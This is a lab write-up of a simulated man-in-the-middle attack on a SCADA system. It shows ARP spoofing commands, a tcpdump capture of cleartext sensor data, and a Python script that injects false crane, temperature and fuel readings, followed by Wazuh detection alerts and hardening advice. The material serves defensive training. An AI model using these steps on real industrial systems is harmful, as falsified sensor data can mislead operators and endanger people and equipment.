# Simulation 3 — SCADA / ICS MitM Attack

**Phase 4 · Maximum impact scenario**

⚠️ **Most dangerous scenario** — the SCADA system controls real physical equipment (cranes, temperature sensors, fuel gauges). Falsified data leads to operators making decisions on false readings.

## Results

| Metric | Real value | Injected value |
|---|---|---|
| Crane weight | 15,709 kg | 38,500 kg |
| Container temp | 3.9°C | 87.5°C |
| Fuel level | 73.7% | 0.0% |

Detection time: **< 1 second** (Wazuh SIEM)

## Step A — ARP Spoofing (MitM)

```bash
# Enable IP forwarding — traffic must keep flowing
echo 1 > /proc/sys/net/ipv4/ip_forward

# Tell Ubuntu that Kali IS the gateway
sudo arpspoof -i eth0 -t 192.168.64.2 192.168.64.1

# Tell the gateway that Kali IS Ubuntu (bidirectional spoof)
sudo arpspoof -i eth0 -t 192.168.64.1 192.168.64.2
```

## Step B — Capturing Live SCADA Data

```bash
sudo tcpdump -i eth0 -w capture_scada.pcap port 5020
```

```
=== LIVE SCADA SENSOR DATA — 192.168.64.2:5020 ===
crane_01_weight  :  15,709 kg
container_temp   :  3.9°C
fuel_level       :  73.7%
# All data in CLEARTEXT — zero encryption
```

## Step C — Injecting False Sensor Data

Full script: [`inject_v2.py`](inject_v2.py)

```bash
python3 inject_v2.py
```

```python
# Core injection logic — SCADA has zero authentication
import socket, json
s = socket.socket()
s.connect(('192.168.64.2', 5020))
payload = {
    "crane_01_weight": 38500.0,
    "container_temp": 87.5,
    "fuel_level": 0.0
}
s.send(json.dumps(payload).encode())
```

## Step D — Wazuh SIEM Detection

| Level | Rule | Alert |
|---|---|---|
| L5 | 100001 | SCADA: External connection to port 5020 from 192.168.64.4 |
| L10 | 100002 | CRITICAL: crane_01_weight = 38500 kg (threshold: 20000 kg) |
| L10 | 100003 | CRITICAL: container_temp = 87.5°C (threshold: 40°C) |
| L8 | 100004 | ARP anomaly: 192.168.64.4 claiming gateway MAC |

## 🔵 Blue Team Lesson

Full SCADA security redesign needed: Modbus/TLS or OPC-UA with mutual certificate auth, OT-aware IDS (Claroty/Dragos/Nozomi), dedicated VLAN segmentation, and physical-limit validation on all sensor readings before acceptance.
